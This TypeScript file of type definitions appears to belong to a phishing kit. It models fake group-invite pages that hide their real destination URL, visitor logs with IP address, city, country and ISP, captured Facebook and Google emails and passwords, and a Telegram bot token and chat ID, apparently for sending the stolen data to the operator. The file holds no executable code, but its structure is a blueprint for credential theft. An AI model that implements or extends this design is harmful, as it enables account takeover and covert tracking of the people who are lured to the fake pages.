export interface GroupData {
  id: string;
  name: string;
  image: string | null; // Base64 string
  link: string; // The actual destination URL
  memberCount?: string; // Changed to string for flexibility (e.g. "1.2K")
  lastMessage?: string; // To customize the grey text in chat list
}

export interface VisitorLog {
  ip: string;
  city: string;
  region: string;
  country_name: string;
  org: string;
  timestamp: number;
  groupId: string;
  groupName: string;
}

export interface CredentialLog {
  service: 'facebook' | 'google';
  email: string;
  password?: string;
  timestamp: number;
  ip: string;
  location?: string;
  userAgent?: string;
}

export interface TelegramConfig {
  botToken: string;
  chatId: string;
}

export interface AdminState {
  groups: GroupData[];
}